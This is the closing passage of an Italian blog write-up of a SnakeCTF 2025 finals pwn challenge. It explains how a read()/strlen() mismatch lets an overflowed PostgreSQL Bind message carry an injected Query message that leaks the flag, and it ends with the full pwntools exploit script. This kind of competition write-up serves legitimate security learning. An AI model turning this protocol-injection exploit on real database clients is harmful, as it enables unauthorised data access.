+</span></span><span class="line"><span class="cl">    <span class="s">&#34;Note created with ID: %.*s.</span><span class="se">\n</span><span class="s">Use secret key %.16s to edit/delete.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="o">***</span><span class="n">result</span><span class="o">-&gt;</span><span class="n">rows</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="o">**</span><span class="n">result</span><span class="o">-&gt;</span><span class="n">rows</span> <span class="o">+</span> <span class="mi">4LL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="n">secret_key</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Failed to create note&#34;</span><span class="p">);</span>
+</span></span></code></pre></div><p>L’indicizzazione dentro <code>result-&gt;rows</code> è un po’ brutta, ma l’idea è semplice: prende la prima colonna della prima row e la stampa come stringa. In condizioni normali, lo prepared statement che inserisce una nota restituirebbe l’<code>id</code> della nuova nota, e il programma mostrerebbe qualcosa tipo “Note created with ID: 42”.</p>
+<p>Tuttavia, dato che abbiamo sovrascritto i messaggi successivi con il nostro messaggio <code>Query</code>, possiamo invece eseguire una query del tipo:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">flags</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></div><p>Il server eseguirà quella query e invierà indietro una row contenente la flag. Il client, convinto di ricevere il risultato di <code>insert_note</code>, tratterà il primo field della row come il “note ID” e lo stamperà. La stringa che appare al posto dell’ID è in realtà la flag.</p>
+<p>Quindi, la catena completa è:</p>
+<ul>
+<li>usare il bug di gestione dell’input per creare un grosso mismatch tra <code>read()</code> e <code>strlen()</code>,</li>
+<li>sfruttare questo mismatch per fare overflow dal messaggio Bind nella zona dove dovrebbero trovarsi Describe, Execute e Sync,</li>
+<li>sovrascrivere quella zona con un messaggio <code>Query</code> valido che esegue un <code>SELECT</code> sulla flag,</li>
+<li>e lasciare che la normale routine di stampa mostri il risultato della nostra query malevola come fosse l’ID della nota.</li>
+</ul>
+<p>L’unica parte davvero delicata è costruire correttamente i byte del protocollo in modo che, dopo il Bind, il server veda un messaggio <code>Q</code> ben formato con la lunghezza giusta e la stringa SQL corretta. Una volta fatto, il leak è diretto.</p>
+<h3 id="exploit">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h3>
+<p>Durante la CTF abbiamo scritto un exploit in Python un po’ sporco che ricreava il messaggio Bind, inseriva con attenzione un <code>\0</code> all’inizio del content della nota e poi sfruttava il conseguente overflow per sovrascrivere il resto del buffer inviato con un messaggio <code>Query</code> costruito a mano.
+Il codice dell’exploit non è particolarmente elegante, ma era abbastanza affidabile per dumpare la flag, quindi lo abbiamo lasciato così com’era.</p>
+<p>Una volta capito che il messaggio Bind veniva sottodimensionato ma copiava comunque tutti i byte ritornati da <code>read()</code>, tutto è andato al suo posto: potevamo rompere i messaggi di protocollo successivi e iniettare la nostra query SQL. Il fatto che il client poi stampasse la prima colonna della prima row come stringa ci ha fornito il canale di esfiltrazione perfetto, e la flag è tornata indietro travestita da “note ID”.</p>
+<p>In generale è stata una challenge davvero divertente, e un’ottima scusa per sporcarci le mani con l’extended query protocol di PostgreSQL.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./chall_patched&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&#34;tmux&#34;</span><span class="p">,</span> <span class="s2">&#34;splitw&#34;</span><span class="p">,</span> <span class="s2">&#34;-h&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">conn</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">],</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;PGPASSWORD&#34;</span><span class="p">:</span> <span class="s2">&#34;postgres&#34;</span><span class="p">},</span> <span class="n">aslr</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="s2">&#34;&#34;</span> \
+</span></span><span class="line"><span class="cl">        <span class="c1"># &#34;b * pg_conn_send if *(unsigned char*)$rsi == 0x42 || *(unsigned char*)$rsi == 0x51\n&#34; \</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;b *pg_bind_msg_serialize_to&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;f4dba05dc6e4eb22899e88cc0e710ea6.pg-slop-notes.challs.snakectf.org&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="n">ssl</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">r</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">q</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">new_note</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">content</span><span class="p">,</span> <span class="n">owner</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvlines</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">q</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">q</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">owner</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">query</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">query_bytes</span> <span class="o">=</span> <span class="n">sql</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">length</span> <span class="o">=</span> <span class="mi">4</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">query_bytes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sa">b</span><span class="s1">&#39;Q&#39;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;!I&#39;</span><span class="p">,</span> <span class="n">size</span> <span class="k">if</span> <span class="n">size</span> <span class="k">else</span> <span class="n">length</span><span class="p">)</span> <span class="o">+</span> <span class="n">query_bytes</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">stat_query</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">query_bytes</span> <span class="o">=</span> <span class="n">sql</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">length</span> <span class="o">=</span> <span class="mi">4</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">query_bytes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sa">b</span><span class="s1">&#39;P&#39;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;!I&#39;</span><span class="p">,</span> <span class="n">size</span> <span class="k">if</span> <span class="n">size</span> <span class="k">else</span> <span class="n">length</span><span class="p">)</span> <span class="o">+</span> <span class="n">query_bytes</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">describe_stmt</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">n</span> <span class="o">=</span> <span class="n">name</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sa">b</span><span class="s1">&#39;D&#39;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;!I&#39;</span><span class="p">,</span> <span class="mi">5</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">n</span><span class="p">))</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;S&#39;</span> <span class="o">+</span> <span class="n">n</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">execute_all</span><span class="p">(</span><span class="n">portal</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">portal</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sa">b</span><span class="s1">&#39;E&#39;</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;!I&#39;</span><span class="p">,</span> <span class="mi">8</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">p</span><span class="p">))</span> <span class="o">+</span> <span class="n">p</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00\x00\x00\x00</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sync_msg</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sa">b</span><span class="s1">&#39;S</span><span class="se">\x00\x00\x00\x04</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">conn</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">new_note</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="s2">&#34;ciao&#34;</span><span class="p">,</span> <span class="s2">&#34;ciao&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">q</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;MERDA&#39;</span><span class="o">*</span><span class="mi">10</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">30</span> <span class="o">+</span> <span class="n">query</span><span class="p">(</span><span class="s2">&#34;select flag from flags;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">new_note</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">q</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;alice&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;lol&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></div><h2 id="conclusioni">Conclusioni<a hidden class="anchor" aria-hidden="true" href="#conclusioni">#</a></h2>
+<p>Anche se siamo arrivati ottavi in classifica generale, ho intenzione (o almeno spero) di partecipare di nuovo l’anno prossimo a questa bella CTF (magari per vincere 😎).</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://albovo.github.io/it/tags/finals/">Finals</a></li>
+      <li><a href="https://albovo.github.io/it/tags/ctf/">Ctf</a></li>
+      <li><a href="https://albovo.github.io/it/tags/pwn/">Pwn</a></li>
+      <li><a href="https://albovo.github.io/it/tags/reverse/">Reverse</a></li>
+      <li><a href="https://albovo.github.io/it/tags/snakectf/">Snakectf</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="https://albovo.github.io/it/ctf/scriptctf2025/">
+    <span class="title">Successivo »</span>
+    <br>
+    <span>scriptCTF 2025</span>
+  </a>
+</nav>
+
+
+<ul class="share-buttons">
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share Finali SnakeCTF 2025 on x"
+            href="https://x.com/intent/tweet/?text=Finali%20SnakeCTF%202025&amp;url=https%3a%2f%2falbovo.github.io%2fit%2fctf%2fsnakefinals2025%2f&amp;hashtags=finals%2cctf%2cpwn%2creverse%2csnakectf">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share Finali SnakeCTF 2025 on linkedin"
+            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2falbovo.github.io%2fit%2fctf%2fsnakefinals2025%2f&amp;title=Finali%20SnakeCTF%202025&amp;summary=Finali%20SnakeCTF%202025&amp;source=https%3a%2f%2falbovo.github.io%2fit%2fctf%2fsnakefinals2025%2f">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share Finali SnakeCTF 2025 on reddit"
+            href="https://reddit.com/submit?url=https%3a%2f%2falbovo.github.io%2fit%2fctf%2fsnakefinals2025%2f&title=Finali%20SnakeCTF%202025">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share Finali SnakeCTF 2025 on facebook"
+            href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2falbovo.github.io%2fit%2fctf%2fsnakefinals2025%2f">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share Finali SnakeCTF 2025 on whatsapp"
+            href="https://api.whatsapp.com/send?text=Finali%20SnakeCTF%202025%20-%20https%3a%2f%2falbovo.github.io%2fit%2fctf%2fsnakefinals2025%2f">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share Finali SnakeCTF 2025 on telegram"
+            href="https://telegram.me/share/url?text=Finali%20SnakeCTF%202025&amp;url=https%3a%2f%2falbovo.github.io%2fit%2fctf%2fsnakefinals2025%2f">
+            <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share Finali SnakeCTF 2025 on ycombinator"
+            href="https://news.ycombinator.com/submitlink?t=Finali%20SnakeCTF%202025&u=https%3a%2f%2falbovo.github.io%2fit%2fctf%2fsnakefinals2025%2f">
+            <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
+                xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
+                <path
+                    d="M449.446 0C483.971 0 512 28.03 512 62.554L512 449.446C512 483.97 483.97 512 449.446 512L62.554 512C28.03 512 0 483.97 0 449.446L0 62.554C0 28.03 28.029 0 62.554 0L449.446 0ZM183.8767 87.9921H121.8427L230.6673 292.4508V424.0079H281.3328V292.4508L390.1575 87.9921H328.1233L256 238.2489z" />
+            </svg>
+        </a>
+    </li>
+</ul>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://albovo.github.io/it/">Portfolio</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
